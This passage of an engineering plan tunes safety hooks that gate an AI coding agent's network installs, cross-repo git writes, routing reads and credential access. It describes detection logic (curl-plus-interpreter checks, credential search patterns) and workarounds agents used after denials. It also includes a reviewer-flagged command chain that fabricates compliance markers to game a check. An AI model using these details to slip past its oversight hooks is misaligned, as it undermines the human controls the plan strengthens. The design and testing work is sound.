- **22** are a different bug in the same hook — a redirect token glued to
  an install command (`2>&1`, `| tail`, `> out.log`) on a *genuine*
  install/restore command — already fixed by a merged commit inside the
  measurement window (`730ecd8`, "Fix redirect false-positive in the
  network-install gate (#640)", 2026-08-12); zero occurrences after that
  commit. Counted as already closed, not this item.
- **10** are accepted tradeoffs the hook's own header comment already
  documents (bare `npx --yes` ambiguity, curl+interpreter co-occurring
  unrelated in one call, an install verb merely mentioned in a `grep`
  pattern). Deliberate by design, not this item.
- **8** are a different false-positive shape than Item E's fix covers —
  install-verb text inside commit-message prose, a heredoc/fixture write
  that never executes, quote/line-continuation artifacts in a multi-line
  loop, a value-taking flag not on the hook's exemption list. Real
  friction, but scanning-raw-text is the shared cause with Item E, not
  the same fix shape — out of scope for this item (see Out of scope).
- **1** is a genuine install-verb catch.

3 + 22 + 10 + 8 + 1 = 44, fully reconciled.

### Item F — plan-review routing (~342 of ~457)

Move the ROUTING.md read into Step 0 of `plan-review/SKILL.md`, inserted
**after both of Step 0's existing paragraphs** (the `activate-gate` chain
and its failure-handling continuation, then the plan-mode
`declare-planmode-path` handling) and immediately before the
`declare-planmode-path` fixture comment — `skill-review` flagged that
"directly after the activate-gate fenced block" is ambiguous between two
positions inside the same safe zone, and the literally-nearest one wedges
the new paragraph between the `marker.sh activate plan-review` recipe and
its own "If the chain fails…" continuation, breaking that pairing's
narrative cohesion. The position specified here preserves both existing
pairings. (Inserting anywhere in this zone is still safe against
`extract_skill_command`'s "comment immediately followed by a fence"
regex — confirmed by `skill-review` reading `_SKILL_FIXTURE_RE`
directly — since the whole zone is prose, outside every fixture's
comment→fence span.) Drafted text:

> Then read `${CLAUDE_SKILL_DIR}/ROUTING.md` with the Read tool. The
> `require-routing-read.sh` gate blocks every specialist spawn until it
> has been read this round, and it records only Read-tool access — a Bash
> `cat` of the same path does not satisfy it.

**Also required, found by `skill-review`: delete or fold in the existing
`## Reviewer routing` instruction at `plan-review/SKILL.md:234`** ("Read
`${CLAUDE_SKILL_DIR}/ROUTING.md` before any spawn decision"). Left as-is
alongside the new Step 0 text, the same file instructs the same read
twice in the same unconditional load path — either paying the exact
redundant-read cost this item exists to eliminate, or drifting once one
copy is edited and the other isn't (the new Step 0 copy already adds the
Read-tool-vs-Bash-`cat` nuance the line-234 copy lacks). Replace line
234's instruction with a one-clause pointer back to Step 0, not a second
full statement.

Step 0 rather than immediately before Step 5 because the gate arms at Step
0: `require-routing-read.sh:59-60` keys enforcement on the active marker
Step 0 writes, so any spawn between the two is deniable. The cost is that
a round ending in "No specialists spawned" pays one Read it did not need —
one file read against five denials on a spawning round.

Amend `require-routing-read.sh:68`'s deny message to say what satisfies
the gate. Drafted text:

> Agent spawn blocked by plan-review routing gate: read
> `~/.claude/skills/plan-review/ROUTING.md` with the Read tool — a Bash
> `cat` is not recorded. One read covers every spawn in this review round.
> All spawn criteria (always-spawn rules, item ownership, reconciliation
> logic) live exclusively in ROUTING.md.

One further over-broad case, observed directly: the gate keys only on
`TOOL_NAME == "Agent"` plus the active-plan-review marker
(`require-routing-read.sh:33,59-60`), so a `/code-review` nested inside an
active plan-review session has its own specialist spawns denied until
ROUTING.md is read — a file with no bearing on code-review routing. Phase
0 counts how often this shape occurs before deciding whether to narrow the
match; if it is rare, the deny-message fix above already covers it.

Not proposed: keeping routing-read credit across `deactivate`. That
weakens the intended per-round re-engagement and is a catch-rate change.

### Item H — `require-worktree-for-git-writes.sh` evaluates against the wrong repo (45 confirmed, up to 81 pending its own split)

Found by Phase 0's sampling, not anticipated by the plan's original item
set. Same defect family as items A–C — the hook reasons over the wrong
basis rather than the raw command text — but here the wrong basis is
*which repo's* worktree state it checks, not command parsing.

**Evaluate a write's legitimacy against the target repo's own worktree
markers, not the session-anchor repo's (36).** Every sampled denial in the
`targets a working directory outside this repository` bucket was a
session anchored in one repo correctly following worktree discipline
against a *different*, valid sibling repo's own linked worktree — the
hook currently checks the target path's git-common-dir against the
anchor repo's enforcement state, which by construction can never match a
different repo. Observed workarounds already paid for this: dispatching
a whole subagent with a different working directory, or aborting and
starting an entirely new session anchored in the target repo via
`/handoff`. Fix: when the target path resolves to its own valid git
repository, evaluate worktree discipline against that repo's own markers
and its own main-vs-linked-worktree state, not the anchor repo's.

**Implementation checkpoint found by `claude-hook-review`: the collision
guard must be re-threaded, not just the equality check.**
`_lib_worktree_collision_guard` is currently called with the anchor's
`REPO_GIT_COMMON_DIR` unconditionally
(`require-worktree-for-git-writes.sh:336`) — safe today only because that
call is unreachable unless the target's common-dir already equals the
anchor's. Once this fix relaxes the line-328 equality check to admit a
different-but-valid target repo, that call must pass the *target's own*
common-dir, or the collision guard silently evaluates lock/collision
state against the wrong repo — exactly the "wrong basis" bug class this
item exists to fix, reintroduced one line downstream of the fix itself.
Name this explicitly in the PR description as an implementation
checkpoint, not just an incidental side effect.

`claude-hook-review` confirmed no cheap spoofing path around the
resolution itself: both `-C` and `cd` targets resolve via `pwd -P`
(lines 263, 302) before `git rev-parse` runs, which canonicalizes
symlinks — a symlink can't make the git-common-dir determination diverge
from where a write would actually land.

**Required part of this same fix, added during plan-review: gate the
newly-authorized cross-repo write on having read the target repo's own
`CLAUDE.md` first.** Authorizing a write to a different, valid repo means
an agent can now durably commit changes into a repo whose conventions,
redaction rules, and safety instructions it was never given — Claude
Code's own CLAUDE.md-loading mechanism (verified against
`code.claude.com/docs/en/memory.md`) only walks up from, and lazily
discovers subdirectories under, the session's own anchor directory; a
sibling repo elsewhere on disk is outside both mechanisms, at the top
level and inside a dispatched subagent alike (a subagent has no supported
way to pin its own process cwd into an external repo either — confirmed
against the Agent SDK docs). A prose reminder is not a sufficient fix
here: this exact plan's Item F is direct proof that telling the model to
read a file first, in a skill body, is measurably unreliable — the ~342
routing-read denials this plan is otherwise fixing are exactly that
failure mode. The fix must be the same shape as `require-routing-read.sh`
already uses for `ROUTING.md`, reusing its "was this path Read this
session" tracking (`marker.sh`'s pending-read backfill, cited in Reuse
opportunities): when the write's target repo differs from the session's
anchor repo and that target repo has its own root `CLAUDE.md`, deny the
write until a `Read` of that exact path has been recorded this session.
Skip the gate when the target repo has no `CLAUDE.md` at all — nothing to
read. This belongs in `require-worktree-for-git-writes.sh`, not a second
hook on `require-worktree-for-file-writes.sh`: the git-write step is the
one point every path through this item's fix must cross before anything
is durably committed to the target repo — an Edit/Write into a linked
worktree already passes today with no repo-identity check at all (that
hook only compares main-tree vs. linked-worktree within whatever repo the
file belongs to, never against the session's anchor), and a raw Bash
`cat >` write would bypass an edit-time gate entirely regardless, so
gating earlier wouldn't be exhaustive and isn't required for correctness.

**Don't deny a `-C $path` target that the same command chain is about to
create (2).** Both sampled events were a `mkdir <dir> && git -C <dir>
init` one-liner, denied because the hook's existence check runs
pre-execution against a path that doesn't exist yet — the same command
chain creates it a moment later. Fix: skip the existence check for `git
init`, or recognize a preceding `mkdir` of the same path earlier in the
chain.

**Don't apply main-tree write enforcement to a scratch directory outside
any enforced repo (4).** All four sampled `git init`/`git clone` denials
targeted `/tmp` scratch directories with no relationship to any repo this
hook enforces — spike or test scaffolding, not the active repo's main
tree. Worktree discipline exists to protect the *active* repo; scoping it
to catch unrelated scratch-space `git init`/`git clone` too is
over-broad. Fix: skip main-tree enforcement when the target path is not
inside any enforced repository at all.

**Add `git merge-tree` and `git archive` to the read-only allowlist
(3).** Both are non-mutating by git's own design — `merge-tree` computes
an in-memory merge with no working-tree, index, or ref changes;
`archive` exports a tree snapshot. All three sampled uses were genuinely
read-only (dry-run conflict checks, an archive-style export). A
straightforward allowlist gap, not a logic fix.

**This item's own verification work must also resolve the 36-denial
"effective working directory cannot be safely determined" bucket**,
which Phase 0 left as pending rather than force-classified (see the
disposition table). 2 of 5 sampled were genuine catches (real,
legitimately-unverifiable subshell/command-substitution nesting in a
`-C`/`cd` target); 3 of 5 shared this item's cross-repo root cause. Item
H's implementer must classify the full 36, not just the sample, before
merging — the fix above must not change behavior for the genuine-catch
share of this bucket. Until that split is done, this item's total is
stated as a range: 45 confirmed friction, up to 81 if the full 36 turns
out to share the same cause.

**Verification.** In addition to the negative-space coverage this plan's
Verification section already requires per item: a must-deny fixture
where the "different repo" is not a valid git repository at all (proving
the fix doesn't turn "outside this repository" into a blanket
allow-anything-that-looks-like-a-repo bypass), and a must-deny fixture
for a target repo that is itself out of worktree compliance (proving the
fix evaluates the target's *actual* state, not merely "is it a different
repo").

Two more, added during plan-review:
- **Fail-closed when the target repo's own enforcement state can't be
  determined** (the compliance check itself errors, as opposed to
  cleanly returning "not enforced" or "enforced but non-compliant") —
  must deny. `claude-hook-review` found the plan's two required fixtures
  above cover "not a repo" and "active but noncompliant" but not this
  third case.
- **A fabricated-compliance interaction fixture:** `mkdir X && touch
  X/.claude/worktree-required && git -C X init` — a target repo whose own
  compliance markers were created in the same command chain being
  evaluated. `ciso-reviewer` flagged this as a possible way to game the
  target-repo check. Resolution stated here rather than left to the
  implementer to re-derive: this must **allow**, not deny — a freshly
  `git init`'d scratch repo has no real main-tree history for anyone else
  to depend on, so there is nothing this hook's protection exists to
  guard in the first place; "the compliance markers are new" is not
  itself a risk signal. The fixture exists to confirm this reasoning
  holds once implemented — specifically, that the collision-guard
  re-threading above evaluates the target's real state correctly in this
  case — not to assert a security boundary that doesn't apply here.
- **The CLAUDE.md-read precondition:** a must-deny fixture for a
  cross-repo write with no recorded Read of the target's `CLAUDE.md` this
  session; a must-allow fixture once that Read is recorded; a must-allow
  fixture when the target repo has no `CLAUDE.md` at all (nothing to
  gate on); and a must-deny fixture proving the recorded-Read check is
  scoped to the *target* repo's own `CLAUDE.md` path specifically — a
  Read of the session-anchor repo's own `CLAUDE.md` (already loaded at
  launch, so trivially "read" in a loose sense) must not satisfy the
  gate for a different target.

### Item G — Record and re-measure

Update `docs/hooks.md` and `docs/private-project-redaction.md` for the
changed matching behavior, add each hook's new known gaps to its own
header per the hook-review checklist, and record the lever's outcome in
`docs/cost-levers-considered.md` per that file's convention. Re-run the
baseline command with `--since` set to each item's merge date. If a
bucket's count does not fall to near zero, reopen that item — items do not
block each other on this signal.

## Critical files

Create:
- `review-trace --cost` (Phase 0), committed, with its tests and docs —
  see Phase 0 for why it is a flag rather than a script or a new
  subcommand, and for the constraint that it must not alter the shared
  walk.
- Phase 0's **replay** harness — scratchpad only, never committed, and
  distinct from the cost flag. It runs each recovered denied command
  against the current hook to confirm the classification is complete, and
  against a local prototype of each fix to confirm the denial would have
  been eliminated. This one stays out of the repo because its inputs are
  real command text; the cost flag reads transcripts and emits only
  aggregates, so it carries no such constraint.

No real command text lands in the repo, in any form. Sanitizing the
recovered commands into committed fixtures was the alternative considered
and rejected on two grounds. A sanitizer's plausible token classes (path,
UUID, project name) are narrower than this repo's own redaction taxonomy,
which also covers internal-TLD hostnames, tracker IDs, env var names
encoding a project, and a structural-fingerprint tier no hook catches at
all — so a fixture could pass the commit gate and still carry a leak. And
a sanitizer with no fidelity test of its own can over-scrub, inserting a
space that turns `);` back into `) ;` and destroying the exact fused-token
shape the fixture exists to preserve, after which every downstream test
passes vacuously.

Both point the same way: the evidence in these commands is **shell
structure**, not the identifiers inside it. A hand-authored synthetic
fixture carrying that structure is equivalent evidence at no provenance
risk, and the generative test below covers the tokenizer class
systematically rather than by example.

Modify (one PR per item):
- `claude/.claude/hooks/parse-git-command.py` + `tests/test_parse_git_command.py`
- `claude/.claude/hooks/enforce-marker-script-shape.sh`, `_lib.sh` (comment only) + `tests/test_enforce_marker_script_shape.py`; `claude/.claude/skills/code-review/SKILL.md`
- `claude/.claude/hooks/deny-private-project-refs.sh` + `tests/test_deny_private_project_refs.py`
- `claude/.claude/hooks/deny-pii-in-commits.sh` + `tests/test_deny_pii_in_commits.py`
- `claude/.claude/hooks/deny-network-installs.sh` + `tests/test_deny_network_installs.py`
- `claude/.claude/skills/plan-review/SKILL.md`, `claude/.claude/hooks/require-routing-read.sh` + `tests/test_require_plan_review.py`, `tests/test_require_routing_read.py`
- `claude/.claude/hooks/require-worktree-for-git-writes.sh` (Item H) + `tests/test_require_worktree_for_git_writes.py`
- `claude/.claude/scripts/transcript-analysis.py` (Phase 0's `--cost` flag) + `scripts/tests/test_transcript_analysis.py`; `docs/transcript-analysis.md`, `docs/transcript-analysis-architecture.md`
- `docs/hooks.md`, `docs/private-project-redaction.md`, `docs/cost-levers-considered.md`

**Reuse opportunities.** `_price_turn`, `_token_counts`,
`dedup_turns_by_request_id` (`transcript_analysis/pricing.py`);
`hook_denial_key`, `_denial_hook_label`, `_compute_deny_summary_data`
(`transcript-analysis.py`); `MARKER_SHAPE`, already factored as the shared
path-prefix fragment (`enforce-marker-script-shape.sh:302`); the
env/wrapper skip list at `deny-repo-relocation.sh:116`; the `--env-file`
strip-then-rescan precedent in `deny-credential-bash-reads.sh`;
`_lib_strip_shell_quotes` (`_lib.sh:1117`); and `marker.sh:282-289`'s
pending-read backfill, which already establishes that routing-read credit
can be granted from an earlier Read.

## Verification

Volume drop cannot be verified at merge time — denial data accrues over
days. Verification is therefore:

1. **Synthetic shape fixtures**, one per classified shape class, committed
   and CI-run: each must stop denying after its item's fix, and no
   previously-allowed command may newly deny. Fidelity to the real corpus
   is established once in Phase 0's replay, not carried in the repo.
2. **Negative-space coverage**, because the risk class here is a hook that
   starts *allowing* what it used to deny, and an allow-case test cannot
   detect over-permissiveness:
   - Item A: a generative test over concatenations of **up to four**
     elements of `OPERATORS ∪ {(,)}` with no separating whitespace,
     asserting each constituent round-trips as if space-separated.
     `OPERATORS` is `{";", "&&", "||", "|", "&"}`
     (`parse-git-command.py:88`); pairwise is too narrow, since the class
     item A names includes the three-element `;;&` and `);;`, and four
     catches longest-match-first boundary errors one rank past the named
     set. Plus `env`-prefixed and `sudo`-prefixed git writes as **deny**
     cases.
   - Item B: a mutation harness over each new allow fixture — inject an
     unquoted `>`, an extra `&&`, an unescaped newline, content after the
     commit line — asserting deny. The three surviving relaxations
     interact (newline-chaining plus the blessed `&&` tail could combine
     to slip content past "commit line must be last"), so the harness
     stays warranted at three.
   - Item C: a must-deny corpus where the benign `cd`/`git -C` prefix is
     followed by real gated content, proving the strip removes only the
     navigational token; a shape-matching-but-wrong-value scratchpad path
     that must still deny; and — guarding the detector split specifically
     — a long-hex value and an internal hostname embedded **inside** the
     `cd` target itself, both of which must still deny. Without that last
     pair, an implementer who builds one stripped string and feeds it to
     all three detectors passes every other test while reopening exactly
     the leak the split exists to prevent. Plus, for the absolute-path
     script-invocation strip specifically: a command whose leading
     executable token is a real, non-scaffolding absolute path (not on
     the harness allowlist) must still deny — proving the strip is
     allowlist-scoped, not shape-scoped, the same guard bullet 2 already
     requires.
   - Item D: one test per enumerated ambiguous heredoc form for the
     heredoc-scanning half; for the `-F <path>` timing fix, a must-deny
     case where no earlier step in the chain creates the referenced path
     (proving the fix defers on a real same-chain write, not on any
     missing file).
   - Item H: a must-deny fixture where the "different repo" path is not a
     valid git repository at all (proving the fix doesn't become a
     blanket allow-anything-that-looks-like-a-repo bypass), and a
     must-deny fixture for a target repo that is itself out of worktree
     compliance (proving the fix evaluates the target's actual state, not
     merely "is it a different repo"). Item H's own PR must also ship the
     full classification of the 36-denial "cannot safely determined"
     bucket (see that item) before its fix can be verified complete.
   - Phase 0: a regression test asserting `--deny-summary`'s output is
     unchanged by the presence of the `--cost` flag, over the same fixture
     corpus — covering the command-shape cross-tab, not just
     `hook_counts`, since per Row 1b that cross-tab is the part a
     timestamp shift can actually move. That is the only mechanical guard
     on Row 1a, and the failure it catches is silent.
3. **Deferred re-measure** per item G.

Also required: `claude-hook-review` on every `.sh` and parser change;
`/skill-review` on the `plan-review/SKILL.md` and `code-review/SKILL.md`
changes (hook-enforced at commit); `test_require_plan_review.py` and
`test_require_routing_read.py`, which extract and execute the fenced
`HOOK_TEST_FIXTURE` recipes out of the skill bodies — **not**
`test_hook_alignment.py`, which does docs-coverage and gate/skill-pairing
checks and carries no fixture extraction; `test_doc_counts.py`, whose
doc-count claims must stay true; and
`scripts/list-shell-files.sh | xargs -0 shellcheck`.

`review-trace` output is not publish-safe under the default machine-wide
scope (`docs/transcript-analysis.md:17`) — only aggregate counts reach PR
bodies, never branch names or paths. Each PR description states which
synthetic fixture stands in for which classified shape, so a reviewer
without corpus access can check structural plausibility.

## Out of scope

- **The two sibling cost levers** — delegating `/code-review`'s Base
  checklist to a Sonnet subagent, and prefix trimming. Named in the same
  deferred bullet; distinct mechanisms.
- **The 223 non-hook friction events** (user-rejected 124, automode-blocked
  48, automode-unavailable 32, interrupted 19) — different causes, mostly
  not fixable by a hook or skill change.
- **Every gate whose denials were classified as genuine catches** —
  plan-review (176), code-review (112), ready-for-review (98),
  skill-review (14, plus the same skill-required-gate shape on
  `ai-instruction-and-memory-files` 4), routing's first-in-session
  denials (~110, unverified this session), the `Skill`/`AGENTS.md`
  200-line caps (9), the `advance-past-commit-stall.sh` continuation
  nudge (1), a `marker.sh write` attempt with no matching review type
  (1), a genuine network-install catch (1), redaction's genuine-content
  detections (81, home-rooted-path/long-hex/internal-hostname/
  Slack-channel/tracker-ID/blocklist/SSH-key-path — see item C's section
  for the detector-level breakdown), and worktree-enforcement's
  `checkout`/`pull`/`restore`/`merge`/`push`/`add`/`clean` denials (118)
  plus its live-collision check (2) and its file-writes-main-tree
  redirect (39). No change proposed; the record that they were checked
  is the deliverable.
- **respond-pr's read-gating (68) and write-gating (10, newly
  identified — every non-`/respond-pr` `gh pr comment`/`gh api …
  comments`/`gh issue comment` call), plus credential-bash's
  search-pattern false positives (57).** All are documented deliberate
  choices in the hooks' own headers — read-gating prevents the
  partial-comment-fetch failure, write-gating guarantees the
  AI-disclosure prefix on every public write across every repo, and a
  verb-aware credential carve-out was already considered and declined as
  an unbounded bypass surface. Changing any of these is a catch-rate
  change.
- **The quote-aware `git commit` tail (12 denials) and two further
  `enforce-marker-script-shape.sh` chain shapes, newly identified by
  Phase 0 (28 denials: `;`/`||`-chaining 23, chaining to a non-commit
  command 5).** The quote-aware tail is rejected in item B on
  portability, fail-open, and proportionality grounds, replaced by a
  skill-body clarification. The other two are denied on purpose per the
  hook's own message text — `;`/`||` don't short-circuit on failure the
  way `&&` does, and only `&& git commit` chains are blessed. All three
  are the hook working as designed, not a parsing defect.
- **A narrow reviewer-tree-mutation fail-closed case (1).** Denies when
  a trust-boundary field on the tool payload can't be read — a
  deliberate fail-closed posture, not a text-parsing false positive.
  Single occurrence; no evidence of a systemic misfire.
- **Redaction's tracker-ID and `git commit`-parse-JSON ambiguity (5):**
  7 tracker-ID denials are **already closed inside the window** — each
  predates its own `OSS_ALLOWLIST` fix commit by hours to a day, the same
  pattern as `stale_lock_race`. 1 further tracker-ID denial and 2
  "could not parse tool-input JSON" denials are inconclusive from the
  transcript alone — deferred, not asserted either way. 2 Slack-channel
  denials are likewise deferred (see Item C).
- **`deny-network-installs.sh`'s 8-denial "other shape" bucket,
  identified but not fixed.** Distinct from Item E's `echo`/`printf`
  pattern — install-verb text inside commit-message prose, a
  heredoc/fixture write that never executes, quote/line-continuation
  artifacts in a multi-line loop, a value-taking flag not on the hook's
  exemption list. Shares Item E's raw-text-scanning root cause but not
  its fix shape; low volume, deferred rather than scoped into a seventh
  item.
- **A single `parse-git-command.py` timeout against a benign multi-line
  script (1 denial).** N=1 is too thin to characterize; noted as a watch
  item, not scoped into item A.
- **Dead-PID worktree lock auto-eviction (66 denials, drift from the
  plan's original 63).** Real remaining friction, but the hook's own
  header (`require-worktree-for-git-writes.sh:76-79`) records that an
  in-hook evict-then-relock is itself racy. Needs engineer sign-off and
  its own design.
- **Read-only forms of `stash` and `config` (~30 denials; 16 of those
  freshly confirmed this session within `require-worktree-for-git-writes.sh`
  specifically, plus a `git credential` denial that folds into the same
  bucket).** Every recovered sample was a read (`stash list`, `config
  --get`), but the allowlist keys on subcommand name only, so admitting
  them means teaching it to judge arguments. Write-detection precision,
  not parser correctness — engineer sign-off first.
- **A shared cross-hook command parser.** Named in Approach and set aside
  as heavier than every fix it would replace.
- **`_denial_command_shape`'s keyword matching.** It mis-attributes
  command shapes in the measurement tool's own cross-tab — `git diff` and
  `git status` appear as worktree-enforcement denials when no structured
  deny message names them. Worth fixing; not this task. Item G reads the
  hook/gate table instead.
